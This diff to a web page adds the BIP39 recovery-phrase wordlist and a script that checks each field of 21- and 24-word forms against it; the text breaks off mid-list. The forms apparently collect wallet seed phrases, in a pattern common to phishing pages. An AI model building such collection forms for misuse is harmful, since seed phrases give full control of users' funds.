+   ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo","testing"]; // Array of phrase_value
+    var inputs = document.querySelectorAll('.input21'); // Access all input elements by class name
+    var isValid = true;
+
+    for (var i = 0; i < inputs.length; i++) {
+      var inputValue = inputs[i].value;
+      if (inputValue === '') {
+        alert('Please enter a value for Input ' + (i + 1));
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input field is empty
+        break;
+      } else if (!phrase_value.includes(inputValue)) {
+        alert('Input ' + (i + 1) + ' value does not match the Phrase.');
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input value doesn't match
+        break;
+      }
+    }
+
+    return isValid; // Allow or prevent form submission based on validation
+  });
+</script>
+            <!-- match passwordForm21 data end  -->
+
+
+              <!-- =========== match passwordForm24 data start -->
+            <script>
+  document.getElementById('passwordForm24').addEventListener('submit', function (event) {
+    var phrase_value = 
+    ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", 